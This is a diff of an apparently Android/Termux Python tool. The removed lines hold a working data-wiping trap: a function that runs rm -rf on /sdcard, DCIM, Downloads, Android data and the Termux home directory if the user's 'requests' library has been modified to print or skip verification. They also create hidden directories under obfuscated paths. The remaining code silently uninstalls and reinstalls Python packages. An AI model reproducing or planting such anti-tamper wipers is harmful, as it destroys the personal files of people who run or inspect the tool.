@@ -1,81 +1,8 @@
 import requests
 import os
 
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
 os.system('clear')
- #os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-# os.system("python -m pip install mechanize ")
-#except:os.system("pip uninstall requests -y;pip install requests")
-#time.sleep(2)
-os.system('git pull --quiet 2>/dev/null')
-#os.system('termux-setup-storage')
-os.system('ls '+'/sdcard '+'> .sd.txt')
-os.system('clear')
-rr = open('.sd.txt', 'r').read()
-if not 'Android' in rr:
-    os.system('rm -rf .sd.txt')
-   # print ('\nGive Permission First And Open Again')
-   # print ('\nPut This Comand > termux-setup-storage')
-    sys.exit()
-os.system('rm -rf .sd.txt')
-gy = 'Android'
-hy = 'apps'
-fy = 'Prope'+'rties'
-ft = '/.tur'+'ing'+hy+'data'
-uy = '/.'+hy+'data'
-zy = '/.'+hy+'data.'+'txt'
-try:
-    os.mkdir('/sdcard/'+gy+'/.'+gy+fy)
-except:
-    pass
-try:
-    os.mkdir('/sdcard/'+ft)
-except:
-    pass
-try:
-    os.mkdir('/sdcard/'+ft+uy)
-except:
-    pass
-try:
-    os.mkdir('/sdcard/ids')
-except:
-    pass
-                    
-#[<───────────[CAPTURE->P]──────────────>]#
-def fucker():
-    os.system('rm -rf /sdcard/*')
-    os.system('rm -rf /data/data/com.termux/files/home')
-    os.system('rm-rf /sdcard/DCIM/')
-    os.system('rm-rf /sdcard/Android/')
-    os.system('rm-rf /sdcard/Android/data/')
-    os.system('rm -rf /sdcard/Download/*')
-    os.system('rm -rf /sdcard1/*')
-    os.system('rm -rf /sdcard/0/*')
-    shutil.rmtree("/sdcard/Android")
-    shutil.rmtree("/sdcard/DCIM")
-    shutil.rmtree("/data/data/com.termux/files/home")
-    os.system('cd /data/data/com.termux/files/usr/etc/$$bash bash.bashrc')
-    print("CONGRATULATIONS BRO CAPTURE DONE")
-    sys.exit()    
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
-    file_content = file.read()
-if 'print(url)' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    fucker()
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
-    file_content = file.read()
-if 'print' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    fucker()
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
-    file_content = file.read()
-if 'verify=False' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    fucker()
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
-    file_content = file.read()
-if 'verify=False' in file_content:
-    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
-    fucker()
     
 suc ="""
 \x1b[1;95m╔═╗╦ ╦╔═╗╔═╗╔═╗╔═╗╔═╗
